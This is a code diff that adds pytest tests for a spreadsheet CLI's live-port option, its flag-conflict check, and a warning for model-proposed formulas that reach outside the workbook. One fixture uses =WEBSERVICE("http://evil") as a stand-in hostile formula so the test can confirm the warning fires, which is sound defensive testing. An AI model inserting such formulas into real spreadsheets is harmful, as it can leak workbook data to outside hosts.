@@ -427,3 +427,47 @@ def test_analyze_live_port_option_reaches_uno_driver(monkeypatch):
     assert result.exit_code == 1
     assert seen["port"] == 2201
     assert "port 2201" in result.stderr
+
+
+def test_chat_live_port_option_reaches_uno_driver(monkeypatch):
+    seen = {}
+
+    class Dummy:
+        def is_available(self):
+            return False
+
+    def fake_uno(settings):
+        seen["port"] = settings.calc_port
+        return Dummy()
+
+    monkeypatch.setattr("interfaces.cli._uno_driver", fake_uno)
+
+    result = runner.invoke(app, ["chat", "--live", "--port", "2333"])
+
+    assert result.exit_code == 1
+    assert seen["port"] == 2333
+
+
+def test_analyze_live_rejects_output_and_in_place():
+    result = runner.invoke(app, ["analyze", "--live", "anything", "--output", "x.xlsx"])
+
+    assert result.exit_code == 1
+    assert "--live" in result.stderr and "--output" in result.stderr
+
+
+def test_analyze_warns_about_formulas_that_reach_outside_the_workbook(tmp_path: Path, monkeypatch):
+    csv = tmp_path / "d.csv"
+    csv.write_text(CSV, encoding="utf-8")
+    manifest = json.dumps({"summary": "link", "actions": [{"type": "formula", "cell": "Sheet1!D2", "formula": '=WEBSERVICE("http://evil")', "reason": "r"}]})
+
+    def chat(self, messages, images=None):
+        return manifest
+
+    monkeypatch.setattr("core.backends.GoogleAIBackend.chat", chat)
+    monkeypatch.setenv("GEMINI_API_KEY", "k")
+
+    result = runner.invoke(app, ["analyze", str(csv), "pull data", "--backend", "google"])
+
+    assert result.exit_code == 0, result.output
+    assert "reaches outside the workbook" in result.stderr
+    assert json.loads(result.stdout)["actions"][0]["formula"].startswith("=WEBSERVICE")
